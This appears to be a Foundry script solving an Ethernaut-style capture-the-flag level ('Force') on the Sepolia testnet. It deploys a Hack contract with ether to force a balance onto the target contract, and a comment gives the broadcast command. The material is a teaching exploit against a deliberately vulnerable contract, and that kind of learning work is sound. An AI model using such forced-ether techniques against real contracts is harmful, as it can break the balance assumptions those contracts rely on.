// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force, Hack} from "../src/level7.sol";

contract Level7Script is Script {
    function run(address instanceAddress) external {
        Force target = Force(instanceAddress);

        vm.startBroadcast();
        new Hack{value: 0.0001 ether}(payable(address(target)));
        vm.stopBroadcast();
        console.log("target.balance: ", address(target).balance);
    }
}
//forge script script/level7.s.sol:Level7Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
